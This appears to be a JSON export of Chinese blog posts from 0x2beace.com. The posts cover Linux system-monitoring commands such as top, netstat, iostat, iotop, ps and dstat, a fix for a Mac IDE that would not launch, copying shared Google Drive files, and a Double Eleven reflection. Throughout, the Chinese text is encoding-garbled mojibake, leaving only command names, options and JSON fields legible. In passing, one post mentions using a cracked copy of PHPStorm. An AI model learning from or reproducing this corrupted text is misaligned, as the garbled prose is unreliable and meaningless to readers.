¸æ•°ï¼‰è¯´æ˜ç³»ç»Ÿæ»¡è´Ÿè·è¿è¡Œã€‚ Tasks totalï¼šæ€»è¿›ç¨‹æ•° runningï¼šæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹æ•° sleepingï¼šç¡çœ çš„è¿›ç¨‹æ•° stoppedï¼šåœæ­¢çš„è¿›ç¨‹æ•° zombieï¼šå†»ç»“çš„è¿›ç¨‹æ•° %Cpu(s) usï¼šç”¨æˆ·è¿›ç¨‹æ¶ˆè€—çš„CPUç™¾åˆ†æ¯” syï¼šå†…æ ¸è¿›ç¨‹æ¶ˆè€—çš„CPUç™¾åˆ†æ¯” niï¼šæ”¹å˜è¿‡ä¼˜å…ˆçº§çš„è¿›ç¨‹å ç”¨CPUçš„ç™¾åˆ†æ¯” idï¼šç©ºé—²CPUçš„ç™¾åˆ†æ¯” waï¼šIOç­‰å¾…æ¶ˆè€—çš„CPUç™¾åˆ†æ¯” Mem totalï¼šç‰©ç†å†…å­˜æ€»é‡ freeï¼šç©ºé—²ç‰©ç†å†…å­˜æ€»é‡ usedï¼šå·²ç”¨ç‰©ç†å†…å­˜æ€»é‡ buffï¼šç”¨ä½œå†…æ ¸ç¼“å­˜å†…å­˜æ€»é‡ Swap totalï¼šè™šæ‹Ÿå†…å­˜æ€»é‡ freeï¼šç©ºé—²è™šæ‹Ÿå†…å­˜æ€»é‡ usedï¼šå·²ç”¨è™šæ‹Ÿå†…å­˜æ€»é‡ mpstatmpstatå‘½ä»¤ æŒ‡ä»¤ä¸»è¦ç”¨äºå¤šCPUç¯å¢ƒä¸‹ï¼Œå®ƒæ˜¾ç¤ºå„ä¸ªå¯ç”¨CPUçš„çŠ¶æ€ç³»ä½ æƒ³ã€‚ è¯­æ³•ï¼š 1mpstat (é€‰é¡¹) (å‚æ•°) é€‰é¡¹ï¼š 1-Pï¼šæŒ‡å®šCPUç¼–å·ã€‚ å‚æ•°ï¼š é—´éš”æ—¶é—´ï¼šæ¯æ¬¡æŠ¥å‘Šçš„é—´éš”æ—¶é—´ï¼ˆç§’ï¼‰ï¼› æ¬¡æ•°ï¼šæ˜¾ç¤ºæŠ¥å‘Šçš„æ¬¡æ•°ã€‚ ALLè¡¨ç¤ºæ˜¾ç¤ºæ‰€æœ‰CPUsï¼Œä¹Ÿå¯ä»¥æŒ‡å®šæŸä¸ªCPUï¼›2è¡¨ç¤ºåˆ·æ–°é—´éš”ã€‚ ç½‘ç»œç›‘æ§sarsarå‘½ä»¤ æ˜¯Linuxä¸‹ç³»ç»Ÿè¿è¡ŒçŠ¶æ€ç»Ÿè®¡å·¥å…·ï¼Œå®ƒå°†æŒ‡å®šçš„æ“ä½œç³»ç»ŸçŠ¶æ€è®¡æ•°å™¨æ˜¾ç¤ºåˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ã€‚ å­—æ®µè¯´æ˜ï¼š IFACEï¼šç½‘ç»œè®¾å¤‡çš„åç§° rxpck/sï¼šæ¯ç§’é’Ÿæ¥æ”¶åˆ°çš„åŒ…æ•°ç›® txpck/sï¼šæ¯ç§’é’Ÿå‘é€å‡ºå»çš„åŒ…æ•°ç›® rxkB/sï¼šæ¯ç§’é’Ÿæ¥æ”¶åˆ°çš„å­—èŠ‚æ•° txkB/sï¼šæ¯ç§’é’Ÿå‘é€å‡ºå»çš„å­—èŠ‚æ•° netstatnetstatå‘½ä»¤ä¸€èˆ¬ç”¨äºæ£€éªŒæœ¬æœºå„ç«¯å£çš„ç½‘ç»œè¿æ¥æƒ…å†µï¼Œç”¨äºæ˜¾ç¤ºä¸IPã€TCPã€UDPå’ŒICMPåè®®ç›¸å…³çš„ç»Ÿè®¡æ•°æ®ã€‚ å¸¸ç”¨å®ä¾‹ï¼š 123456789netstat -aup # è¾“å‡ºæ‰€æœ‰UDPè¿æ¥çŠ¶å†µnetstat -atp # è¾“å‡ºæ‰€æœ‰TCPè¿æ¥çŠ¶å†µnetstat -s # æ˜¾ç¤ºå„ä¸ªåè®®çš„ç½‘ç»œç»Ÿè®¡ä¿¡æ¯netstat -i # æ˜¾ç¤ºç½‘å¡åˆ—è¡¨netstat -r # æ˜¾ç¤ºè·¯ç”±è¡¨ä¿¡æ¯netstat -l # åªæ˜¾ç¤ºç›‘å¬ç«¯å£netstat -lt # åªåˆ—å‡ºæ‰€æœ‰ç›‘å¬ tcp ç«¯å£netstat -lu # åªåˆ—å‡ºæ‰€æœ‰ç›‘å¬ udp ç«¯å£netstat -lx # åªåˆ—å‡ºæ‰€æœ‰ç›‘å¬ UNIX ç«¯å£ ç£ç›˜ç›‘æ§dfdfå‘½ä»¤ ç”¨äºæ˜¾ç¤ºç£ç›˜åˆ†åŒºä¸Šçš„å¯ä½¿ç”¨çš„ç£ç›˜ç©ºé—´ã€‚å¦‚æœæ²¡æœ‰æ–‡ä»¶åè¢«æŒ‡å®šï¼Œåˆ™æ˜¾ç¤ºå½“å‰æ‰€æœ‰è¢«æŒ‚è½½çš„æ–‡ä»¶ç³»ç»Ÿï¼Œé»˜è®¤ä»¥ KB ä¸ºå•ä½ã€‚ è¯­æ³•ï¼š 1df (é€‰é¡¹) (å‚æ•°) é€‰é¡¹ï¼š-a å…¨éƒ¨æ–‡ä»¶ç³»ç»Ÿåˆ—è¡¨-h ä»¥æ–¹ä¾¿é˜…è¯»çš„æ–¹å¼æ˜¾ç¤º-i æ˜¾ç¤ºinodeä¿¡æ¯-T æ˜¾ç¤ºæ–‡ä»¶ç³»ç»Ÿç±»å‹-l åªæ˜¾ç¤ºæœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ-k ä»¥KBä¸ºå•ä½-m ä»¥MBä¸ºå•ä½ å‚æ•°ï¼š æ–‡ä»¶ï¼šæŒ‡å®šæ–‡ä»¶ç³»ç»Ÿä¸Šçš„æ–‡ä»¶ã€‚ iostatiostatå‘½ä»¤ è¢«ç”¨äºç›‘è§†ç³»ç»Ÿè¾“å…¥è¾“å‡ºè®¾å¤‡å’ŒCPUçš„ä½¿ç”¨æƒ…å†µã€‚ è¯­æ³•ï¼š 1iostat (é€‰é¡¹) (å‚æ•°) é€‰é¡¹ï¼š-cï¼šä»…æ˜¾ç¤ºCPUä½¿ç”¨æƒ…å†µï¼›-dï¼šä»…æ˜¾ç¤ºè®¾å¤‡åˆ©ç”¨ç‡ï¼›-kï¼šæ˜¾ç¤ºçŠ¶æ€ä»¥åƒå­—èŠ‚æ¯ç§’ä¸ºå•ä½ï¼Œè€Œä¸ä½¿ç”¨å—æ¯ç§’ï¼›-mï¼šæ˜¾ç¤ºçŠ¶æ€ä»¥å…†å­—èŠ‚æ¯ç§’ä¸ºå•ä½ï¼›-pï¼šä»…æ˜¾ç¤ºå—è®¾å¤‡å’Œæ‰€æœ‰è¢«ä½¿ç”¨çš„å…¶ä»–åˆ†åŒºçš„çŠ¶æ€ï¼›-tï¼šæ˜¾ç¤ºæ¯ä¸ªæŠ¥å‘Šäº§ç”Ÿæ—¶çš„æ—¶é—´ï¼›-Vï¼šæ˜¾ç¤ºç‰ˆå·å¹¶é€€å‡ºï¼›-xï¼šæ˜¾ç¤ºæ‰©å±•çŠ¶æ€ã€‚ å‚æ•°ï¼š é—´éš”æ—¶é—´ï¼šæ¯æ¬¡æŠ¥å‘Šçš„é—´éš”æ—¶é—´ï¼ˆç§’ï¼‰ï¼› æ¬¡æ•°ï¼šæ˜¾ç¤ºæŠ¥å‘Šçš„æ¬¡æ•°ã€‚ å­—æ®µè¯´æ˜ï¼š r/s: æ¯ç§’å®Œæˆçš„è¯» I/O è®¾å¤‡æ¬¡æ•°ã€‚ w/s: æ¯ç§’å®Œæˆçš„å†™ I/O è®¾å¤‡æ¬¡æ•°ã€‚ rkB/s: æ¯ç§’è¯»Kå­—èŠ‚æ•°.æ˜¯ rsect/s çš„ä¸€åŠ,å› ä¸ºæ¯æ‰‡åŒºå¤§å°ä¸º512å­—èŠ‚ã€‚ wkB/s: æ¯ç§’å†™Kå­—èŠ‚æ•°.æ˜¯ wsect/s çš„ä¸€åŠã€‚ avgrq-sz: å¹³å‡æ¯æ¬¡è®¾å¤‡I/Oæ“ä½œçš„æ•°æ®å¤§å° (æ‰‡åŒº)ã€‚ avgqu-sz: å¹³å‡I/Oé˜Ÿåˆ—é•¿åº¦ã€‚ await: å¹³å‡æ¯æ¬¡è®¾å¤‡I/Oæ“ä½œçš„ç­‰å¾…æ—¶é—´ (æ¯«ç§’)ã€‚ svctm: å¹³å‡æ¯æ¬¡è®¾å¤‡I/Oæ“ä½œçš„æœåŠ¡æ—¶é—´ (æ¯«ç§’)ã€‚ %util: ä¸€ç§’ä¸­æœ‰ç™¾åˆ†ä¹‹å¤šå°‘çš„æ—¶é—´ç”¨äº I/O æ“ä½œ,æˆ–è€…è¯´ä¸€ç§’ä¸­æœ‰å¤šå°‘æ—¶é—´ I/O é˜Ÿåˆ—æ˜¯éç©ºçš„ã€‚ iotopiotopå‘½ä»¤ æ˜¯ä¸€ä¸ªç”¨æ¥ç›‘è§†ç£ç›˜I/Oä½¿ç”¨çŠ¶å†µçš„topç±»å·¥å…·ã€‚ iotopå…·æœ‰ä¸topç›¸ä¼¼çš„UIï¼Œå…¶ä¸­åŒ…æ‹¬PIDã€ç”¨æˆ·ã€I/Oã€è¿›ç¨‹ç­‰ç›¸å…³ä¿¡æ¯ã€‚Linuxä¸‹çš„IOç»Ÿè®¡å·¥å…·å¦‚iostatï¼Œnmonç­‰å¤§å¤šæ•°æ˜¯åªèƒ½ç»Ÿè®¡åˆ°perè®¾å¤‡çš„è¯»å†™æƒ…å†µï¼Œå¦‚æœä½ æƒ³çŸ¥é“æ¯ä¸ªè¿›ç¨‹æ˜¯å¦‚ä½•ä½¿ç”¨IOçš„å°±æ¯”è¾ƒéº»çƒ¦ï¼Œä½¿ç”¨iotopå‘½ä»¤å¯ä»¥å¾ˆæ–¹ä¾¿çš„æŸ¥çœ‹ã€‚ è¯­æ³•ï¼š 1iotop (é€‰é¡¹) é€‰é¡¹ï¼š-oï¼šåªæ˜¾ç¤ºæœ‰ioæ“ä½œçš„è¿›ç¨‹-bï¼šæ‰¹é‡æ˜¾ç¤ºï¼Œæ— äº¤äº’ï¼Œä¸»è¦ç”¨ä½œè®°å½•åˆ°æ–‡ä»¶ã€‚-nï¼š NUMï¼šæ˜¾ç¤ºNUMæ¬¡ï¼Œä¸»è¦ç”¨äºéäº¤äº’å¼æ¨¡å¼ã€‚-d SECï¼šé—´éš”SECç§’æ˜¾ç¤ºä¸€æ¬¡ã€‚-p PIDï¼šç›‘æ§çš„è¿›ç¨‹pidã€‚-u USERï¼šç›‘æ§çš„è¿›ç¨‹ç”¨æˆ·ã€‚ iotopå¸¸ç”¨å¿«æ·é”®ï¼š å·¦å³ç®­å¤´ï¼šæ”¹å˜æ’åºæ–¹å¼ï¼Œé»˜è®¤æ˜¯æŒ‰IOæ’åºã€‚ rï¼šæ”¹å˜æ’åºé¡ºåºã€‚ oï¼šåªæ˜¾ç¤ºæœ‰IOè¾“å‡ºçš„è¿›ç¨‹ã€‚ pï¼šè¿›ç¨‹/çº¿ç¨‹çš„æ˜¾ç¤ºæ–¹å¼çš„åˆ‡æ¢ã€‚ aï¼šæ˜¾ç¤ºç´¯ç§¯ä½¿ç”¨é‡ã€‚ qï¼šé€€å‡ºã€‚ è¿›ç¨‹pspsï¼ˆProcess Statusï¼Œè¿›ç¨‹çŠ¶æ€ï¼‰å‘½ä»¤ ç”¨äºæŠ¥å‘Šå½“å‰ç³»ç»Ÿçš„è¿›ç¨‹çŠ¶æ€ã€‚ ps çš„ç”¨æ³•éå¸¸å¤šï¼Œè¿™é‡Œä»…åˆ—ä¸¾ä¸€äº›å¸¸ç”¨çš„ï¼š 123456ps -aux | grep &lt;name&gt; # æŸ¥çœ‹name è¿›ç¨‹è¯¦ç»†ä¿¡æ¯ps -p &lt;pid&gt; -L # æ˜¾ç¤ºè¿›ç¨‹&lt;pid&gt; çš„æ‰€æœ‰çº¿ç¨‹ps -o lstart &lt;pid&gt; # æ˜¾ç¤ºè¿›ç¨‹çš„å¯åŠ¨æ—¶é—´ps -f --forest -C &lt;name&gt; # ç”¨æ ‘çš„é£æ ¼æ˜¾ç¤ºè¿›ç¨‹çš„å±‚æ¬¡å…³ç³»ps -e -o pid,uname,pcpu,pmem,comm,etime # å®šåˆ¶æ˜¾ç¤ºçš„åˆ—ps -o lstart &lt;pid&gt; # æ˜¾ç¤ºè¿›ç¨‹çš„å¯åŠ¨æ—¶é—´ ç³»ç»Ÿç›‘æ§å…¨èƒ½å·¥å…·glancesglances æ˜¯ä¸€ä¸ªç”¨æ¥ç›‘è§† GNU/Linux å’Œ FreeBSD æ“ä½œç³»ç»Ÿçš„ GPL æˆæƒçš„å…¨èƒ½å·¥å…·ã€‚ Glances ä¼šç”¨ä¸€ä¸‹å‡ ç§é¢œè‰²æ¥ä»£è¡¨çŠ¶æ€ï¼š ç»¿è‰²ï¼šOKï¼ˆä¸€åˆ‡æ­£å¸¸ï¼‰ è“è‰²ï¼šCAREFULï¼ˆéœ€è¦æ³¨æ„ï¼‰ ç´«è‰²ï¼šWARNINGï¼ˆè­¦å‘Šï¼‰ çº¢è‰²ï¼šCRITICALï¼ˆä¸¥é‡ï¼‰ã€‚ é˜€å€¼å¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­è®¾ç½®ï¼Œä¸€èˆ¬é˜€å€¼è¢«é»˜è®¤è®¾ç½®ä¸ºï¼ˆcareful=50ã€warning=70ã€critical=90ï¼‰ã€‚ dstatdstatå‘½ä»¤ æ˜¯ä¸€ä¸ªç”¨æ¥æ›¿æ¢vmstatã€iostatã€netstatã€nfsstatå’Œifstatè¿™äº›å‘½ä»¤çš„å·¥å…·ã€‚ ç›´æ¥ä½¿ç”¨dstatï¼Œé»˜è®¤ä½¿ç”¨çš„æ˜¯-cdngyå‚æ•°ï¼Œåˆ†åˆ«æ˜¾ç¤ºcpuã€diskã€netã€pageã€systemä¿¡æ¯ï¼Œé»˜è®¤æ˜¯1sæ˜¾ç¤ºä¸€æ¡ä¿¡æ¯ã€‚ å‚è€ƒé“¾æ¥ Linuxç³»ç»Ÿç›‘æ§å‘½ä»¤æ•´ç†æ±‡æ€»-æŒæ¡CPU,å†…å­˜,ç£ç›˜IOç­‰æ‰¾å‡ºæ€§èƒ½ç“¶é¢ˆ","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://www.0x2beace.com/tags/Ubuntu/"}]},{"title":"Mac ä¸‹IDEA æ— æ³•æ­£å¸¸å¯åŠ¨","slug":"idea-cannot-start-normally-under-mac","date":"2020-11-15T15:37:34.000Z","updated":"2020-11-18T08:42:47.601Z","comments":true,"path":"idea-cannot-start-normally-under-mac/","link":"","permalink":"https://www.0x2beace.com/idea-cannot-start-normally-under-mac/","excerpt":"å‰è¨€ä»Šå¤©æœ¬æ¥æ‰“ç®—ä½¿ç”¨PHPStormçš„ï¼Œä½†æ˜¯çªç„¶å¯åŠ¨ä¸äº†äº†ï¼Œå°±æ˜¯åŒå‡»åº”ç”¨ç¨‹åºä¹‹åï¼Œç”µè„‘æ²¡æœ‰ä»»ä½•ååº”ã€‚","text":"å‰è¨€ä»Šå¤©æœ¬æ¥æ‰“ç®—ä½¿ç”¨PHPStormçš„ï¼Œä½†æ˜¯çªç„¶å¯åŠ¨ä¸äº†äº†ï¼Œå°±æ˜¯åŒå‡»åº”ç”¨ç¨‹åºä¹‹åï¼Œç”µè„‘æ²¡æœ‰ä»»ä½•ååº”ã€‚ å› ä¸ºä½¿ç”¨çš„PHPStormæ˜¯ç ´è§£çš„ï¼Œæ‰€ä»¥æˆ‘ä»¥ä¸ºæ˜¯å¤±æ•ˆäº†ã€‚å°±åœ¨æˆ‘ä¸€ç­¹è«å±•å‡†å¤‡é‡è£…ä¸€éçš„ï¼Œçªç„¶æƒ³èµ·â€è¦ä¸è¯•è¯•é€šè¿‡å‘½ä»¤è¡Œå¯åŠ¨â€œï¼Ÿ äºæ˜¯æˆ‘æ‰¾åˆ°PHPStromçš„åŒ…æ–‡ä»¶ä¹‹åï¼Œå°è¯•é€šè¿‡å‘½ä»¤è¡Œå¯åŠ¨ï¼Œè™½ç„¶åŒæ ·å¤±è´¥äº†ï¼Œä½†æ˜¯å‘½ä»¤è¡Œè¾“å‡ºäº†ä¸€äº›ä¿¡æ¯ã€‚ æ­£æ˜¯è¿™äº›ä¿¡æ¯ï¼Œæ‰è®©æˆ‘æƒ³èµ·æ¥ï¼Œä»Šå¤©ä¸Šåˆåœ¨æ•´ç†æ–‡ä»¶æ—¶ï¼Œä¸å°å¿ƒæŠŠPHPStormä¸­ä¾èµ–çš„ä¸€ä¸ªæ–‡ä»¶ç»™åˆ é™¤æ‰äº†ã€‚ äºæ˜¯ï¼Œé©¬ä¸Šæ‰¾åˆ°äº†é‚£ä¸ªæ–‡ä»¶å¹¶è¿˜åŸäº†ï¼Œä¹‹åæœç„¶èƒ½æ­£å¸¸å¯åŠ¨äº†ã€‚ è§£å†³åŠæ³•å¦‚æœä½ ä¹Ÿé‡åˆ°äº†ç±»ä¼¼çš„æƒ…å†µï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•è¿™ç§æ–¹å¼ï¼Œæˆ–è®¸èƒ½å¸®åŠ©ä½ æ‰¾åˆ°é—®é¢˜æ‰€åœ¨ã€‚ æ‰¾åˆ°åº”ç”¨ç¨‹åº å³é”®æ˜¾ç¤ºåŒ…æ–‡ä»¶ ä¾æ¬¡è¿›å…¥Contents-&gt;MacOS åŒå‡»shellè„šæœ¬ æ¥ç€æ— è®ºæˆåŠŸæˆ–å¤±è´¥éƒ½èƒ½è¾“å‡ºä¸€äº›å†…å®¹ï¼Œç„¶ååˆ©ç”¨è¿™äº›å†…å®¹å»æŸ¥æ‰¾é—®é¢˜æ‰€åœ¨ã€‚","categories":[{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/categories/Mac/"}],"tags":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/tags/Skill/"},{"name":"Mac","slug":"Mac","permalink":"https://www.0x2beace.com/tags/Mac/"}]},{"title":"Google Drive å¦‚ä½•è½¬å­˜æ–‡ä»¶ï¼Ÿ","slug":"how-does-google-drive-transfer-files","date":"2020-11-13T13:55:50.000Z","updated":"2020-11-13T13:57:07.503Z","comments":true,"path":"how-does-google-drive-transfer-files/","link":"","permalink":"https://www.0x2beace.com/how-does-google-drive-transfer-files/","excerpt":"å¯¹äºåˆæ¬¡ä½¿ç”¨Google Driveï¼ˆä»¥ä¸‹ç®€ç§° GDï¼‰çš„åŒå­¦æ¥è¯´ï¼Œå¯èƒ½ä¼šæœ‰ä»¥ä¸‹å‡ ç‚¹å›°æƒ‘ã€‚","text":"å¯¹äºåˆæ¬¡ä½¿ç”¨Google Driveï¼ˆä»¥ä¸‹ç®€ç§° GDï¼‰çš„åŒå­¦æ¥è¯´ï¼Œå¯èƒ½ä¼šæœ‰ä»¥ä¸‹å‡ ç‚¹å›°æƒ‘ã€‚ å¤§å®¶å¸¸è¯´çš„è½¬å­˜æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ å¸¸è§çš„è½¬å­˜æ–¹å¼æœ‰å“ªå‡ ç§ï¼Ÿ åœ¨æ­£å¼å›ç­”ä¸Šé¢ä¸¤ä¸ªé—®é¢˜ä¹‹å‰ï¼Œå…ˆæ¥äº†è§£ä¸€ä¸‹GDã€‚ GD æ˜¯Google åœ¨2012 å¹´4 æœˆ24 æ—¥æ¨å‡ºçš„ä¸€ä¸ªåœ¨çº¿åŒæ­¥å­˜å‚¨æœåŠ¡ï¼Œç±»ä¼¼ç™¾åº¦çš„ç™¾åº¦ç½‘ç›˜ï¼Œä¸è¿‡ä¸åŒä¹‹å¤„åœ¨äºGD ä¸ä¼šé™é€Ÿã€‚æ™®é€šç”¨æˆ·é»˜è®¤çš„å­˜å‚¨ç©ºé—´æ˜¯15 GBã€‚ ç”¨æˆ·å¯ä»¥å°†å…¶ä»–ç”¨æˆ·åˆ†äº«çš„æ–‡ä»¶æ·»åŠ åˆ°â€œæˆ‘çš„äº‘ç«¯ç¡¬ç›˜â€ï¼Œè¿™ç§æ–¹å¼å¹¶ä¸ä¼šå ç”¨ç”¨æˆ·çš„å­˜å‚¨ç©ºé—´ï¼Œè¿™ä¸ªæ“ä½œç›¸å½“äºæ˜¯åœ¨â€œæˆ‘çš„äº‘ç«¯ç¡¬ç›˜â€ä¸­åˆ›å»ºäº†ä¸€ä¸ªè½¯é“¾æ¥ï¼Œå¯ä»¥å¿«é€Ÿè®¿é—®è¯¥æ–‡ä»¶ï¼Œè€Œæ–‡ä»¶æ‰€æœ‰è€…åˆ™è¿˜æ˜¯åˆ†äº«è€…ï¼Œå¦‚æœåŸä½œè€…åˆ é™¤äº†ï¼Œé‚£ä¹ˆä½ ç½‘ç›˜é‡Œçš„ä¹Ÿä¼šæ¶ˆå¤±ã€‚ æ‰€ä»¥ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œè½¬å­˜çš„æ¦‚å¿µä¾¿è¯ç”Ÿäº†ï¼Œå®ƒå­˜åœ¨çš„æ„ä¹‰æ˜¯å°†å…¶ä»–ç”¨æˆ·åˆ†äº«çš„æ–‡ä»¶ä¿å­˜è‡³è‡ªå·±çš„äº‘ç›˜ï¼Œç±»ä¼¼ç™¾åº¦ç½‘ç›˜çš„â€œä¿å­˜åˆ°æˆ‘çš„ç½‘ç›˜â€åŠŸèƒ½ã€‚ ä½†æœ‰æ‰€ä¸åŒçš„æ˜¯ï¼Œå¦‚æœåˆ†äº«è€…æ²¡æœ‰å¼€æ”¾æƒé™ï¼Œé‚£ä¹ˆå…¶ä»–ç”¨æˆ·åˆ™æ— æƒè½¬å­˜ã€‚ æ–¹å¼ä¸€åœ¨éœ€è¦è½¬å­˜çš„æ–‡ä»¶ä¸Šï¼Œç‚¹å‡»å³é”®ï¼Œåˆ¶ä½œä¸€ä¸ªæ‹·è´ï¼Œæ‹·è´çš„æ–‡ä»¶ä½äºâ€œæˆ‘çš„äº‘ç«¯ç¡¬ç›˜â€ä¸­ã€‚ ç¬¬ä¸€ç§æ–¹å¼æœ€ç®€å•ï¼Œé€‚ç”¨äºå°æ–‡ä»¶ï¼Œä¸èƒ½å¯¹æ–‡ä»¶å¤¹è¿›è¡Œ Copy æ“ä½œã€‚ æ–¹å¼äºŒCopy, URL to Google Drive æ˜¯ä¸€ä¸ªäº‘ç«¯ç¡¬ç›˜æ’ä»¶ã€‚ åœ¨ç›®æ ‡æ–‡ä»¶ä¸Šç‚¹å‡»å³é”®ï¼Œé€‰æ‹©æ‰“å¼€æ–¹å¼ï¼Œå…³è”æ›´å¤šåº”ç”¨ã€‚ æœç´¢Copy, URL to Google Drive è¿›è¡Œå®‰è£…ã€‚ å®‰è£…å®Œæˆä¹‹åï¼Œè¿˜éœ€è¦è¿›è¡ŒGoogle è´¦å·æˆæƒæ‰èƒ½è¿›è¡Œè½¬å­˜æ“ä½œã€‚ åœ¨éœ€è¦è½¬å­˜çš„æ–‡ä»¶å¤¹ä¸Š å³é”®-æ‰“å¼€æ–¹å¼-Copy, URL to Google Driveï¼Œä¹‹åç‚¹å‡» Save, Copy to Google Driveï¼Œå°±å¯ä»¥çœ‹è§æ­£åœ¨è½¬å­˜äº†ï¼Œå¦‚æœæ–‡ä»¶è¾ƒå¤§æ—¶é—´ä¼šæ¯”è¾ƒä¹…ã€‚ æ–¹å¼ä¸‰åœ¨Telegram ä¸Šæœ‰äººå¼€å‘äº†ä¸€ä¸ªæœºå™¨äººï¼ˆ@GoogleDriveManagerBotï¼‰ï¼Œä¸“é—¨ç”¨äºGD æ–‡ä»¶è½¬å­˜ã€‚ è¯¥æœºå™¨äººå¯ä»¥å®ç°è°·æ­Œç½‘ç›˜èµ„æºè½¬å­˜ä»¥åŠç½‘ç›˜å†…èµ„æºæ‰¹é‡é‡å‘½åï¼Œæ™®é€šç”¨æˆ·ä»…å¯ç»‘å®šä¸€ä¸ª GD è´¦å·ã€‚é€šè¿‡ç®€å•çš„å‘½ä»¤å³å¯å¯¹æ–‡ä»¶è¿›è¡Œè½¬å­˜ã€‚ æ€»ç»“æ–¹å¼ä¸€æœ€ç®€å•ï¼Œé—¨æ§›æœ€ä½ï¼Œå³ä½¿åœ¨æ²¡æœ‰æƒé™çš„æƒ…å†µä¸‹ï¼Œä¹Ÿèƒ½è¿›è¡ŒCopy æ“ä½œï¼Œä½†æ˜¯æ•ˆç‡å¾ˆä½ã€‚ æ–¹å¼äºŒã€ä¸‰çœäº‹ï¼Œæ•ˆç‡é«˜ï¼Œä½†å‰ææ˜¯å¾—æœ‰æƒé™ã€‚ å‚è€ƒé“¾æ¥ ä¸€ä¸ªæ–¹ä¾¿è½¬å­˜ Google Drive åˆ†äº«æ–‡ä»¶çš„æ–¹æ³• è½¬å­˜Google Driveèµ„æºåˆ°è‡ªå·±çš„Google Drive Linux ä¸‹ä½¿ç”¨ rclone æŒ‚è½½ç½‘ç›˜åˆ°æœ¬åœ°","categories":[{"name":"Skill","slug":"Skill","permalink":"https://www.0x2beace.com/categories/Skill/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Google Drive","slug":"Google-Drive","permalink":"https://www.0x2beace.com/tags/Google-Drive/"}]},{"title":"äº’è”ç½‘äººçš„åŒåä¸€","slug":"double-eleven-for-internet-people","date":"2020-11-12T00:33:10.000Z","updated":"2020-11-12T00:34:35.354Z","comments":true,"path":"double-eleven-for-internet-people/","link":"","permalink":"https://www.0x2beace.com/double-eleven-for-internet-people/","excerpt":"æˆ‘å…¶å®ä¸å¤ªä¼šå»å†™è¿™ç±»æ–‡ç« ï¼Œé‚£ä¸ºä»€ä¹ˆè¦å†™è¿™ç¯‡æ–‡ç« å‘¢ï¼Ÿæƒ³æŠ“ä½åŒåä¸€çš„å°¾å·´ï¼Œè®°å½•ä¸€äº›æƒ³æ³•ã€‚","text":"æˆ‘å…¶å®ä¸å¤ªä¼šå»å†™è¿™ç±»æ–‡ç« ï¼Œé‚£ä¸ºä»€ä¹ˆè¦å†™è¿™ç¯‡æ–‡ç« å‘¢ï¼Ÿæƒ³æŠ“ä½åŒåä¸€çš„å°¾å·´ï¼Œè®°å½•ä¸€äº›æƒ³æ³•ã€‚ ä»Šå¹´çš„åŒåä¸€æˆ‘æœ¬æ¥ä¹Ÿæ˜¯å•¥éƒ½æ²¡ä¹°ï¼Œ å¯å°±åœ¨æ™šä¸Šä¸ƒç‚¹å·¦å³ï¼Œçº¿ä¸Šçš„æŸä¸ªå¹³å°ï¼Œå‡ºäº†ä¸€ç‚¹é—®é¢˜ï¼Œè®¢å•çš„ç›ˆäºè·Ÿç”¨æˆ·çš„ä½™é¢å¯¹ä¸ä¸Šã€‚ç»è¿‡ä¸€ç•ªæ’æŸ¥å‘ç°æ˜¯å› ä¸ºå¤„ç†è®¢å•çš„é‚£ä¸ªè„šæœ¬ä¸çŸ¥ä¸ºä½•ç‰¹åˆ«æ…¢ï¼Œå¯¼è‡´å¤§é‡è®¢å•å…¨éƒ¨å †ç§¯åœ¨ä¸€èµ·äº†ã€‚ å› ä¸ºä¸€äº›å†å²åŒ…è¢±çš„åŸå› ï¼Œåœ¨å¤„ç†æ–¹å¼ä¸Šæˆ‘æ˜¯çŸ¥é“è¿™ä¸ªè„šæœ¬å­˜åœ¨ä¸€äº›éšæ‚£çš„ã€‚åŒäº‹æè®®ä¸å¦‚è¿™ä¸ªè„šæœ¬è®©ä»–å»ç”¨Node.js å†™å§ï¼Œå°½ç®¡å¾ˆä¸æƒ…æ„¿ï¼Œä½†ä¹Ÿæ²¡åŠæ³•ã€‚ æƒ³åœ¨ä»”ç»†å›æƒ³ï¼Œå½“æ—¶é‚£ç§æ„Ÿè§‰è¿˜æ˜¯å¾ˆæ¸…æ™°ï¼Œæˆ‘çœŸçš„ä¸å–œæ¬¢é‚£ç§èƒ½è¢«æ›¿ä»£çš„æ„Ÿè§‰ï¼Œé‚£ä¸€ç¬é—´è§‰å¾—æ‰€æœ‰çš„å¨±ä¹æ´»åŠ¨éƒ½æ²¡æœ‰æ„æ€äº†ï¼Œåªæœ‰æŠŠæŠ€æœ¯æ‰æ˜¯å”¯ä¸€çš„çƒ­çˆ±ã€‚ æ™šä¸Šå›å®¶ä¹‹åï¼Œç¬¬ä¸€ä»¶äº‹åº”è¯¥æ˜¯ç»ƒå‰ä»–ï¼Œä½†æ˜¨å¤©ä¼¼ä¹ä¹Ÿæ²¡å•¥å¿ƒæ€ç»ƒäº†ã€‚ ä»Šå¹´æœ¬æ¥å°±æ²¡å°‘ä¸ºçŸ¥è¯†ä»˜è´¹ï¼Œè§†é¢‘è¯¾ç¨‹ï¼Œç”µå­ä¹¦ç±ï¼Œçº¸è´¨ä¹¦ç±å„ç§å­¦ä¹ èµ„æ–™ã€‚ ç„¶åæ˜¨å¤©æ™šä¸Šåˆåœ¨æ…•è¯¾ç½‘ä¸Šä¹°äº†ä¸‰é—¨å®æˆ˜è¯¾ç¨‹ï¼ŒçœŸçš„ä¸æƒ³åšä¸€ä¸ªCruderï¼Œè¿™æ˜¯æˆ‘æœ€åçš„å€”å¼ºäº†ã€‚ åœ¨å¦‚ä»Šè¿™ä¸ªäº’è”ç½‘é«˜é€Ÿå‘å±•çš„æ—¶ä»£ï¼Œæˆ‘æƒ³å­¦ä¹ ä»¥åŠéœ€è¦å­¦ä¹ 